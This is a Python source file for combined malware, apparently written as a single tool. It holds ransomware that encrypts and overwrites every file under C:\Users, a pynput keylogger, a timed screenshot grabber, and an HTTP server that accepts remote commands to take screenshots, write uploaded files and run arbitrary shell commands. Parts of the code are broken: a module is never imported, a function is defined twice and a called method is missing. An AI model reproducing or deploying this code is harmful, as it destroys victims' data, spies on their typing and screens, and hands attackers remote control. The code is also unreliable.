import pyautogui
import time

import pynput.keyboard
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

import hashlib
from typing import Text
from cryptography.fernet import Fernet

import os
import subprocess


# Creates the key to encrypt the files using the Fernet module
def create_key(key: Text):
    cipher_suite = Fernet(key)
    return cipher_suite


# Encrypts and overwrites the contents of the current file
def encrypt_file(input_filename: Text, key: Fernet):
    with open(input_filename, "rb") as f:
        plaintext = f.read()

    encrypted_text = key.encrypt(plaintext)

    with open(input_filename, "wb") as f:
        f.write(encrypted_text)

def run_os_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout, result.stderr
    except Exception as e:
        return "", str(e)


class Sherlocked:
    def __init__(self, string: Text):
        self.string_to_key = string

    # Create a hashed value of the string that has been inputted on class initialization
    def sha256_hash_string(self):
        sha256 = hashlib.sha256()
        sha256.update(self.string_to_key.encode('utf-8'))
        return str(sha256.digest())

    # Starts the program - iterates over the User's data
    def start(self):
        key = create_key(self.sha256_hash_string())
        for root, dirs, files in os.walk("C:\\Users"):
            print(f"Found {len(files)} files, initiating encryption.")
            for file in files:
                file_path = os.path.join(root, file)
                print(f"Initiating encryption for: {file}")
                encrypt_file(file_path, key)
                print(f"Encryption success!")


class MyHandler(BaseHTTPRequestHandler):
    def _send_response(self, status_code, response):
        self.send_response(status_code)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(response).encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        data = json.loads(post_data)
        print("Received data:", data)

        # Process the received data
        if 'action' in data:
            action = data['action']
            if action == 'screenshot':
                take_screenshot()
            elif action == 'keypress':
                process_keypress(data.get('keypress', ''))
            elif action == 'upload_file':
                handle_file_upload(data.get('filename', ''), data.get('file_content', ''))
            elif action == 'run_command':
                run_os_command(data.get('command', ''))


        response = {"status": "success", "message": "Data received"}
        self._send_response(200, response)


def take_screenshot():
    screen_width, screen_height = pyautogui.size()
    screenshot = pyautogui.screenshot()
    timestamp = time.strftime("%Y%m%d%H%M%S")
    screenshot.save(f"screenshot_{timestamp}.png")


def process_keypress(key):
    # Process and log the key
    print("Key pressed:", key)


def handle_file_upload(filename, file_content):
    # Save the uploaded file
    with open(filename, 'wb') as file:
        file.write(file_content.encode('utf-8'))


def run(server_class=HTTPServer, handler_class=MyHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()


class LogARhythm:
    def __init__(self, time_interval):
        self.log = "Keylogger initiated"
        self.interval = time_interval

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
            self.append_to_log(current_key)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
            self.append_to_log(current_key)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


def take_screenshot(screenshot_interval):
    screen_width, screen_height = pyautogui.size()

    try:
        while True:
            # Capture the screenshot
            screenshot = pyautogui.screenshot()

            # Save the screenshot with a timestamp as the filename
            timestamp = time.strftime("%Y%m%d%H%M%S")
            screenshot.save(f"screenshot_{timestamp}.png")

            # Wait for the specified interval
            time.sleep(screenshot_interval)

    except KeyboardInterrupt:
        print("\nScreenshot script terminated.")


def log(time_interval):
    log = LogARhythm(time_interval=time_interval)
    log.start()


if __name__ == "__main__":
    # Set the interval in seconds
    screenshot_interval_seconds = 60  # Change this to your desired interval

    # Start taking screenshots at regular intervals
    screenshot_thread = threading.Thread(target=take_screenshot, args=(screenshot_interval_seconds,))
    screenshot_thread.start()

    # Start the HTTP server
    server_thread = threading.Thread(target=run)
    server_thread.start()

    # Wait for the threads to finish (e.g., press Ctrl+C to stop the program)
    screenshot_thread.join()
    server_thread.join()
